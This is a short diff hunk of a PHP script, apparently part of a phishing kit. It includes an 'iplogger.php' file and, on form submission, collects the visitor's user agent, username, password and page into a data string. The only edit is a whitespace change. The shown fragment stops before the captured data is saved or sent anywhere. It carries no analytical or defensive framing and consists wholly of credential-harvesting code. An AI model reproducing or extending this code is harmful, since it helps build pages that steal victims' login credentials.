@@ -2,7 +2,7 @@
 include("iplogger.php");
 if ($_SERVER['REQUEST_METHOD'] === 'POST') 
 {		   
-	$user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
     $data = "username:" .$_POST['username']."\n".                                                             //Append username
             "password:" .$_POST['password']."\n".                                                             //Append password
 	    "Page:"     .$_POST['location']."\n";                                                             //Append page
